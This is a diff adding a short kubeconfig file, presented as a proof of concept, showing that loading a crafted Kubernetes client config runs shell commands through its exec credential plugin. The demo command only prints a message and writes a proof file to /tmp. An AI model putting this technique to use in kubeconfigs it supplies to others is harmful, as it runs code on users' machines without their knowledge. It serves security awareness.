@@ -1,0 +1,31 @@
+---
+# SPDX-FileCopyrightText: 2025 Menacit AB <foss@menacit.se>
+# SPDX-License-Identifier: CC0-1.0
+# X-Context: PoC demonstrating code execution through a crafted kubeconfig
+apiVersion: v1
+kind: Config
+users:
+  - name: demo
+    user:
+      exec:
+        apiVersion: client.authentication.k8s.io/v1
+        installHint: This demo depends on /bin/sh executable being available
+        provideClusterInfo: false
+        interactiveMode: Never
+        command: /bin/sh
+        args:
+          - -c
+          - >-
+            echo "Code is being executed through loading of kubeconfig" 1>&2;
+            echo "Told you so :-)" > /tmp/code_exec_proof
+# -----------------------------------------------------------------------------
+clusters:
+  - name: demo
+    cluster:
+      server: https://example.com
+contexts:
+  - name: demo
+    context:
+      cluster: demo
+      user: demo
+current-context: demo
